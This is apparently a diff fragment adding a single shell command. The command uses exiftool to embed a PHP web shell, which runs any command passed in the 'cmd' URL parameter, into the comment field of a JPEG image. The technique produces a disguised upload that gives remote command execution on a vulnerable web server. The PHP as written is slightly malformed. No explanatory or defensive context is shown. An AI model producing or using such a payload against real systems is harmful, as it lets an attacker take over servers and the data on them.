@@ -1,0 +1,2 @@
+exiftool -Comment="<?php passthru(\$_GET'cmd'); _halt_compiler();" /root/picture.jpeg
+
